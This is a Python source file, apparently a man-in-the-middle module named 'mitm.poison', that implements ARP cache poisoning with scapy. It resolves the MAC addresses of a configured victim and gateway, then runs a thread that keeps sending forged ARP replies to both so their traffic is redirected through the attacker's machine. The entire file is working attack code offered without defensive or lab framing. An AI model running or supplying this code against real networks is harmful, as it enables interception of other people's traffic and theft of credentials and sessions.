import logging
import threading
import time
from scapy.all import *

class bootstrap(object):
    config = {}
    log = None
    database = None
    poison = None

    def __init__(self, config, database):
        self.config = config
        self.log = logging.getLogger("mitm.poison")
        self.database = database



        self.log.info("poison module loaded")

    def originalMAC(self, ip):
        ans, unans = scapy.all.srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
        for s, r in ans:
            return r.sprintf("%Ether.src%")

    def invoke(self):
        if self.config.get("poison").get("victim") is None:
            self.stop_thread()
            if self.poison:
                del self.poison
        elif not self.poison:
            self.poison = Poisoner(self.config, self.log,
                               self.config.get("poison").get("victim"),
                               self.originalMAC(self.config.get("poison").get("victim")),
                               self.config.get("poison").get("gateway"),
                               self.originalMAC(self.config.get("poison").get("gateway")))

            self.poison.start()

    def stop_thread(self):
        if self.poison:
            self.poison.stop()
            self.poison.join()

    def close(self):
        self.stop_thread()
        self.log.info("poison module has downed")

class Poisoner(threading.Thread):
    running = True
    config = None
    log = None
    victimIP = 0
    victimMAC = 0
    gatewayIP = 0
    gatewayMAC = 0

    def __init__(self, config, log, victimIP = 0, victimMAC = 0, gatewayIP = 0, gatewayMAC = 0):
        super(Poisoner, self).__init__()
        self.config = config
        self.log = log
        self.set_parameters(victimIP, victimMAC, gatewayIP, gatewayMAC)
        self.running = True

    def set_parameters(self, victimIP, victimMAC, gatewayIP, gatewayMAC):
        self.victimIP = victimIP
        self.victimMAC = victimMAC
        self.gatewayIP = gatewayIP
        self.gatewayMAC = gatewayMAC

        self.log.info("poison victim %s and gateway %s" % (victimIP, gatewayIP))

    def run(self):
        while self.running:
            send(ARP(op=2, pdst=self.victimIP, psrc=self.gatewayIP, hwdst=self.victimMAC), verbose=0)
            send(ARP(op=2, pdst=self.gatewayIP, psrc=self.victimIP, hwdst=self.gatewayMAC), verbose=0)
            time.sleep(self.config.get('poison').get('delay'))

    def stop(self):
        self.running = False